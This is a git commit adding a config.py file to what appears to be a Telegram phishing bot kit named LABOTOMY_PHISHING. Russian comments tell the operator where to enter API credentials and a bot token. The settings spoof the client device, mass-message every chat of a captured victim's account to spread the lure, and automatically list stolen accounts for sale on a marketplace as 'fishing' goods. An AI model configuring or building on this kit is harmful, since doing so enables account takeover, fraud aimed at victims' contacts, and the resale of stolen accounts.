8b2138f0dda7b90dc25f82fd8ccac7cc9c05864a
ScullTeam_Official <121667818+ScullTeam@users.noreply.github.com>
2024-11-10 09:58:39 +0100

    Add files via upload

---
+++ LABOTOMY_PHISHING/config.py
@@ -0,0 +1,35 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+api_id = 6991792 #сюда айпи-айди
+api_hash = "токен" #сюда айпи-хеш
+API_TOKEN = "токен" #сюда токен бота
+admin = 10000000 #сюда твой айди
+updates = -100 #сюда айди канала с логами
+# НЕ ТРОГАТЬ!!!
+device_model = "Linux"
+system_version = "Ubuntu 22.04.1 LTS"
+app_version = "8.4.1 (2522)"
+lang_code = "en"
+system_lang_code = "en-US"
+
+SEND_MSG = '@{username} ' #сюда текст который будет отправляться всем чатам чела которого ты скинешь на аккаунт
+
+
+WELCOME_PHOTO_URL = 'тут' #прямая ссылка на приветственное фото в боте (можно использовать сервис https://imgbb.com)
+REG_PHOTO_URL = 'тут' #тоже самое что сверху только фото которое будет при регистрации
+
+#ТАКЖЕ замени текста в файле texts.py (по желанию)
+
+#Замени twoj_user на юз твоего бота в spam.py
+
+#И можешь заменить название кнопок на свои в kbs.py
+
+
+AUTO_SELL_LOLZ = False
+LOLZ_KEY = ''
+LOLZ_ACCOUNT_PRICE = 11
+LOLZ_ACCOUNT_PREMIUM_PRICE = 80
+LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
+LOLZ_ACCOUNT_ORIGIN = 'fishing'
+LOLZ_ACCOUNT_DESCRIPTION = ''
